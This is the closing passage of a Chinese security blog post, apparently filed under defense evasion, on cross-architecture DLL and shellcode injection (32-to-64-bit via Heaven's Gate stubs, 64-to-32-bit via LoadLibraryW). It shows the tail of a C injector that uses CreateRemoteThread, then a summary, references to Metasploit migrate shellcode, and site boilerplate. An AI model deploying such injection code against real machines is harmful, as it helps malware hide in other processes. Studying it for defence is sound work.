LoadLibraryAddr = NULL;</span><br><span class="line">    LoadLibraryAddr = GetLoadLibraryW(hProcess);</span><br><span class="line">    <span class="keyword">if</span> (LoadLibraryAddr == NULL) &#123;</span><br><span class="line">        MessageBoxW(NULL, L<span class="string">&quot;无法获取LoadLibraryW地址&quot;</span>, FileName, MB_OK);</span><br><span class="line">        VirtualFreeEx(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryAddr, lpAddress, NULL, NULL);</span><br><span class="line">    <span class="keyword">if</span> (hThread == NULL) &#123;</span><br><span class="line">        MessageBoxW(NULL, L<span class="string">&quot;创建远程线程失败&quot;</span>, FileName, MB_OK);</span><br><span class="line">        VirtualFreeEx(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    VirtualFreeEx(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F12%2F01%2F18-41-20-d1853153d4d67e2e06767895d64ba9ac-PixPin_2025-12-01_18-41-15-057d0b.png" alt="PixPin_2025-12-01_18-41-15.png"></p>
+<p><strong>注意</strong>⚠：当你成功注入DLL后，想要再一次对同一个目标进程注入dll时没有出现弹窗，这是因为DLL已经加载到目标进程的内存空间了，所以不会触发DLL里 <code>DLL_PROCESS_ATTACH</code> 里的执行逻辑。</p>
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F12%2F01%2F18-42-00-2072d00e6cea47b786e25e430c47cb68-PixPin_2025-12-01_18-41-57-c42b69.png" alt="PixPin_2025-12-01_18-41-57.png"></p>
+<p>64-&gt;32 注入shellcode就是普通的远程线程注入，不在这里赘述。</p>
+<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>32-&gt;64跨位数注入的原理非常简单，难就难在两个stub的构造，对于不熟悉汇编的师傅来说是有一定的挑战性的。stub1负责CPU短长模式切换，stub2负责寻找到 <code>RtlCreateUserThread</code> 的地址并调用。</p>
+<p>64-&gt;32的原理就更简单了，与普通的远程线程注入的核心差异就是需要获取32目标进程的 <code>kernel32.dll</code> 模块，进而获取 <code>LoadLibraryW</code> 函数地址，这样 <code>CreateRemoteThread</code> 才不会出错。</p>
+<p>这种比较接近系统底层，需要编写汇编的技术，对于大部分人来说学起来挺吃力的，我也不例外，希望本文能给帮助到各位师傅！</p>
+<p>我开头说过，跨位数注入的原理来源heaven’s gate，但其只是heaven’s gate的冰山一角，heaven’s gate里面的内容还有很多值得学习的，至少能水1到2篇文章（认真脸），不过这都是以后的事情了。</p>
+<p>至于下篇文章的主题应该是与Beacon有关，还没想好只是有一个大概的方向。太多人写过的主题我不太想发先知上，我对发在先知上的文章有一定的要求：<strong>与众不同，有一点技术性含量</strong>，不过对于只有一年学习经验的我来说还是非常具有挑战性的，毕竟“太阳底下没有新鲜事”，我写的这些文章都是前人早已提出并实现，我只是总结而已。除了先知之外，我也会在博客上分享一些碎碎念和简短的技术分享，感兴趣的师傅可以去看看。</p>
+<p>最后求一下三连啊！师傅的点赞、收藏和关注真的对我很重要呜呜呜呜呜呜&gt;.&lt;</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm">metasploit-framework&#x2F;external&#x2F;source&#x2F;shellcode&#x2F;windows&#x2F;x86&#x2F;src&#x2F;migrate&#x2F;executex64.asm at master · rapid7&#x2F;metasploit-framework</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm">metasploit-framework&#x2F;external&#x2F;source&#x2F;shellcode&#x2F;windows&#x2F;x64&#x2F;src&#x2F;migrate&#x2F;remotethread.asm at master · rapid7&#x2F;metasploit-framework</a></li>
+<li><a target="_blank" rel="noopener" href="http://blog.rewolf.pl/blog/?p=1484">wow64ext v1.0.0.8 – ReWolf 的博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://undocumented.ntinternals.net/">NTAPI Undocumented Functions</a></li>
+<li><a target="_blank" rel="noopener" href="https://xia0ji233.pro/2024/06/18/RemoteThreadInject/">关于64位进程注入32位进程的分析 | xia0ji233’s blog</a></li>
+</ol>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/10/23/%E6%96%B0%E7%94%B5%E8%84%91/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-12-12 19:21:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF/" title="防御规避">
+                        <b>#</b> 防御规避
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/12/12/Execute-NET-Assembly/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81x32%E2%86%92x64"><span class="toc-text">一、x32→x64</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-migrate-executex64"><span class="toc-text">1.1 migrate_executex64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%88%87%E6%8D%A2%E5%A0%86%E6%A0%88%E3%80%81%E4%BF%9D%E5%AD%98%E9%9D%9E%E6%98%93%E5%A4%B1%E6%80%A7%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="toc-text">（一）切换堆栈、保存非易失性寄存器和参数传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89CPU%E7%9F%AD%E6%A8%A1%E5%BC%8F%E5%88%87%E6%8D%A2%E6%88%90%E9%95%BF%E6%A8%A1%E5%BC%8F%EF%BC%8C%E6%89%A7%E8%A1%8C%E9%9C%80%E8%A6%81%E5%9C%A8x64%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%89%A7%E8%A1%8C%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="toc-text">（二）CPU短模式切换成长模式，执行需要在x64模式下执行的机器码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%81%A2%E5%A4%8D%E5%A0%86%E6%A0%88%E5%92%8C%E9%9D%9E%E6%98%93%E5%A4%B1%E6%80%A7%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%8C%E6%9C%80%E5%90%8E%E8%BF%94%E5%9B%9E%E5%88%B0inject%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B8%AD%EF%BC%8C%E6%89%A7%E8%A1%8Cinject%E7%9A%84%E5%90%8E%E7%BB%AD%E6%B5%81%E7%A8%8B"><span class="toc-text">（三）恢复堆栈和非易失性寄存器，最后返回到inject的代码中，执行inject的后续流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89stub1%E5%9C%A8AMD-CPU%E5%92%8CIntel-CPU%E4%B8%8A%E7%9A%84%E7%BB%86%E5%BE%AE%E5%B7%AE%E5%BC%82"><span class="toc-text">（四）stub1在AMD CPU和Intel CPU上的细微差异</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-migrate-wownativex"><span class="toc-text">1.2 migrate_wownativex</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="toc-text">（一）初始化与栈对齐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%A0%B9%E6%8D%AEHASH%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-text">（二）根据HASH动态获取目标函数地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%8F%82%E6%95%B0%E5%87%86%E5%A4%87%E3%80%81%E8%B0%83%E7%94%A8GetProcessAddrByHash"><span class="toc-text">（三）参数准备、调用GetProcessAddrByHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E5%B9%B6%E6%B8%85%E7%90%86%E6%A0%88"><span class="toc-text">（四）返回结果并清理栈</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-inject"><span class="toc-text">1.3 inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E6%B5%8B%E8%AF%95"><span class="toc-text">1.4 测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81x64-x32"><span class="toc-text">二、x64-&gt;x32</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">三、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'kr7nhXQQsnagsiZAr9IIxoDq-gzGzoHsz',
+        appKey: 'Sujqic7fHSzakqEntTDwEJp3',
+        placeholder: 'Welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/onedays12">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/onedays12">Copyright © 2025 oneday</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E8%B7%A8%E4%BD%8D%E6%95%B0%E6%B3%A8%E5%85%A5 + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F12%2F12%2F%25E8%25B7%25A8%25E4%25BD%258D%25E6%2595%25B0%25E6%25B3%25A8%25E5%2585%25A5%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/12/12/%E8%B7%A8%E4%BD%8D%E6%95%B0%E6%B3%A8%E5%85%A5/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
